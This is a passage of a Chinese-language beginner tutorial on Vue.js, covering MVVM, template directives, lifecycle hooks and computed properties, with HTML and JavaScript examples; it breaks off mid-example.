        <content type="html"><![CDATA[<h2 id="一、VUE简介"><a href="#一、VUE简介" class="headerlink" title="一、VUE简介"></a>一、VUE简介</h2><h4 id="1-1-使用jQuery的复杂性问题"><a href="#1-1-使用jQuery的复杂性问题" class="headerlink" title="1.1 使用jQuery的复杂性问题"></a>1.1 使用jQuery的复杂性问题</h4><ul><li>使用jQuery进行前后端分离开发，既可以实现前后端交互（ajax）,又可以完成数据渲染；</li><li>存在的问题：jQuery需要通过HTML标签拼接、DOM节点操作完成数据的显示，开发效率低且容易出错，渲染效率较低</li><li>vue 是继jQuery之后的又一优秀的前端框架：专注于前端数据的渲染——语法简单、渲染效率高</li></ul><h4 id="1-2-VUE简介"><a href="#1-2-VUE简介" class="headerlink" title="1.2 VUE简介"></a>1.2 VUE简介</h4><h6 id="1-2-1-前端框架"><a href="#1-2-1-前端框架" class="headerlink" title="1.2.1 前端框架"></a>1.2.1 前端框架</h6><ul><li>前端三要素：HTML、CSS、JavaScript<ul><li>HTML决定网页结构</li><li>CSS决定显示效率</li><li>JavaScript决定网页功能（交互、数据显示）</li></ul></li><li>UI框架：<ul><li>Bootstrap</li><li>amazeUI</li><li>Layui</li></ul></li><li>JS框架：<ul><li>jQuery（jQuery UI）</li><li>React </li><li>angular</li><li>nodejs—-后端开发</li><li>vue 集各种前端框架的优势发展而来</li></ul></li></ul><h6 id="1-2-2-MVVM"><a href="#1-2-2-MVVM" class="headerlink" title="1.2.2 MVVM"></a>1.2.2 MVVM</h6><blockquote><p>项目结构经历的三个阶段：</p></blockquote><p><strong>后端MVC</strong> 我们就可以理解为单体架构，流程控制是由后端控制器来完成</p><p><strong>前端MVC</strong> 前后端分离开发，后端只负责接收响应请求</p><p><strong>MVVM</strong> 前端请求后端接口，后端返回数据，前端接收数据，并将接收的数据设置“VM”,HTML从vm取值</p><ul><li><p>M model  数据模型   指的是后端接口返回的数据</p></li><li><p>V  view   视图</p></li><li><p>VM  ViewModel 视图模型  数据模型与视图之间的桥梁，后端返回的model转换前端所需的vm，视图层可以直接从vm中提取数据</p><table><thead><tr><th>MVC</th><th>MVVM</th></tr></thead><tbody><tr><td><img src="imgs/1618815280470.png" alt="1618815280470"></td><td><img src="imgs/1618815307813.png" alt="1618815307813"></td></tr></tbody></table></li></ul><h2 id="二、-vue的入门使用"><a href="#二、-vue的入门使用" class="headerlink" title="二、 vue的入门使用"></a>二、 vue的入门使用</h2><blockquote><p>Vue 被设计为可以自底向上逐层应用。Vue 的核心库只关注视图层，不仅易于上手，还便于与第三方库或既有项目整合.</p></blockquote><h4 id="2-1-vue的引入"><a href="#2-1-vue的引入" class="headerlink" title="2.1 vue的引入"></a>2.1 vue的引入</h4><ul><li><p>离线引用：下载vue的js文件，添加到前端项目，在网页中通过script标签引用vue.js文件</p></li><li><p>CDN引用：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.jsdelivr.net/npm/vue/dist/vue.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="2-2-入门案例"><a href="#2-2-入门案例" class="headerlink" title="2.2 入门案例"></a>2.2 入门案例</h4><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>从vm中获取的数据为：{{str}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">{</span>str<span class="token operator">:</span><span class="token string">"从前有座山"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="三、-vue的语法"><a href="#三、-vue的语法" class="headerlink" title="三、 vue的语法"></a>三、 vue的语法</h2><h4 id="3-1-基本类型数据和字符串"><a href="#3-1-基本类型数据和字符串" class="headerlink" title="3.1 基本类型数据和字符串"></a>3.1 基本类型数据和字符串</h4><pre class="line-numbers language-html" data-language="html"><code class="language-html">{{code}}{{str}}-------------------------data:{code:10,str:"test"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-2-对象类型数据"><a href="#3-2-对象类型数据" class="headerlink" title="3.2 对象类型数据"></a>3.2 对象类型数据</h4><ul><li>支持ognl语法</li></ul><pre class="line-numbers language-html" data-language="html"><code class="language-html">{{stu.stuNum}}{{stu.stuName}}-----------------------------data{    stu:{        stuNum:"100001",        stuName:"张三",        stuGender:"M",        stuAge:20    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-3-条件-v-if"><a href="#3-3-条件-v-if" class="headerlink" title="3.3 条件 v-if"></a>3.3 条件 v-if</h4><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stu.stuGender==<span class="token punctuation">'</span>M<span class="token punctuation">'</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>男<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span>-------------------------------------------------------data:{    stu:{        stuNum:"100001",        stuName:"张三",        stuGender:"M",        stuAge:20    }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-4-循环-v-for"><a href="#3-4-循环-v-for" class="headerlink" title="3.4 循环 v-for"></a>3.4 循环 v-for</h4><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>table</span> <span class="token attr-name">border</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1<span class="token punctuation">"</span></span> <span class="token attr-name">cellspacing</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>0<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>400<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>序号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>学号<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>姓名<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>性别<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>th</span><span class="token punctuation">&gt;</span></span>年龄<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>th</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tr</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s,index in stus<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>{{index+1}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>{{s.stuNum}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>{{s.stuName}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s.stuGender == <span class="token punctuation">'</span>M<span class="token punctuation">'</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>男<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">v-if</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>s.stuGender == <span class="token punctuation">'</span>F<span class="token punctuation">'</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>女<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>td</span><span class="token punctuation">&gt;</span></span>{{s.stuAge}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>td</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tr</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>table</span><span class="token punctuation">&gt;</span></span>---------------------------------------------------------------------data:{    stus:[        {            stuNum:"100001",            stuName:"张大三",            stuGender:"M",            stuAge:23        },        {            stuNum:"100002",            stuName:"张中三",            stuGender:"M",            stuAge:22        },        {            stuNum:"100003",            stuName:"张小三",            stuGender:"F",            stuAge:20        }    ]}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-5-v-bind绑定标签属性"><a href="#3-5-v-bind绑定标签属性" class="headerlink" title="3.5 v-bind绑定标签属性"></a>3.5 v-bind绑定标签属性</h4><ul><li><code>v-bind:</code>  可简写为 <code>:</code></li></ul><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">v-bind:</span>value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>str<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">:src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stu.stuImg<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>------------------------------------data{str:"从前有座山",stu:{        stuImg:"img/01.jpg"       }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-6-表单标签的双向绑定-v-model"><a href="#3-6-表单标签的双向绑定-v-model" class="headerlink" title="3.6 表单标签的双向绑定 v-model"></a>3.6 表单标签的双向绑定 v-model</h4><ul><li>只能使用在表单输入标签</li><li>v-model:value  可以简写为  v-model</li></ul><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name"><span class="token namespace">v-model:</span>value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>str<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>str<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>------------------------------------data{str:"从前有座山"}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="四、vue实例"><a href="#四、vue实例" class="headerlink" title="四、vue实例"></a>四、vue实例</h2><blockquote><p>每个使用vue进行数据渲染的网页文档都需要创建一个Vue实例 —— ViewModel</p></blockquote><h4 id="4-1-Vue实例的生命周期"><a href="#4-1-Vue实例的生命周期" class="headerlink" title="4.1 Vue实例的生命周期"></a>4.1 Vue实例的生命周期</h4><blockquote><p>vue实例生命周期——vue实例从创建到销毁的过程</p></blockquote><ul><li>创建vue实例（初始化data、加载el）</li><li>数据挂载（将vue实例data中的数据渲染到网页HTML标签）</li><li>重新渲染（当vue的data数据发生变化，会重新渲染到HTML标签）</li><li>销毁实例</li></ul><h4 id="4-2-钩子函数"><a href="#4-2-钩子函数" class="headerlink" title="4.2 钩子函数"></a>4.2 钩子函数</h4><blockquote><p>为了便于开发者在vue实例生命周期的不同阶段进行特定的操作，vue在生命周期四个阶段的前后分别提供了一个函数，这个函数无需开发者调用，当vue实例到达生命周期的指定阶段会自动调用对应的函数。</p></blockquote><table><thead><tr><th></th></tr></thead><tbody><tr><td><img src="imgs/lifecycle.png" alt="1618882028565"></td></tr></tbody></table><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">v-once</span><span class="token punctuation">&gt;</span></span>{{str}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span><span class="token punctuation">&gt;</span></span>{{str}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>str<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function-variable function">beforeCreate</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//1.data初始化之前执行，不能操作data</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function-variable function">created</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//2.data初始化之后执行，模板加载之前，可以修改/获取data中的值</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//this.str = "山里有座庙";</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function-variable function">beforeMount</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//3.模板加载之后，数据初始渲染（挂载）之前，可以修改/获取data中的值</span><span class="token comment">//this.str = "庙里有口井";</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function-variable function">mounted</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//4.数据初始渲染（挂载）之后，可以对data中的变量进行修改，但是不会影响v-once的渲染</span><span class="token comment">//this.str = "井里有只蛙";</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function-variable function">beforeUpdate</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//5.数据渲染之后，当data中的数据发生变化触发重新渲染，渲染之前执行此函数</span><span class="token comment">//  data数据被修改之后，重新渲染到页面之前</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"-----"</span><span class="token operator">+</span><span class="token keyword">this</span><span class="token punctuation">.</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">this</span><span class="token punctuation">.</span>str <span class="token operator">=</span> <span class="token string">"从前有座山2"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function-variable function">updated</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//6.data数据被修改之后，重新渲染到页面之后</span><span class="token comment">//this.str = "从前有座山3";</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function-variable function">beforeDestroy</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//7.实例销毁之前</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token function-variable function">destroyed</span><span class="token operator">:</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment">//8.实例销毁之后</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="五、计算属性和侦听器"><a href="#五、计算属性和侦听器" class="headerlink" title="五、计算属性和侦听器"></a>五、计算属性和侦听器</h2><h4 id="5-1-计算属性"><a href="#5-1-计算属性" class="headerlink" title="5.1 计算属性"></a>5.1 计算属性</h4><blockquote><p>data中的属性可以通过声明获得，也可以通过在computed通过计算获得</p><p>特性：计算属性所依赖的属性值发生变化会影响计算属性的值同时发生变化</p></blockquote><p><strong>示例</strong></p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>js/vue.js<span class="token punctuation">"</span></span> <span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>str1<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>str2<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/&gt;</span></span>{{str3}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>el<span class="token operator">:</span><span class="token string">"#container"</span><span class="token punctuation">,</span>data<span class="token operator">:</span><span class="token punctuation">{</span>str1<span class="token operator">:</span><span class="token string">"千锋"</span><span class="token punctuation">,</span>str2<span class="token operator">:</span><span class="token string">"武汉"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>computed<span class="token operator">:</span><span class="token punctuation">{</span><span class="token function-variable function">str3</span><span class="token 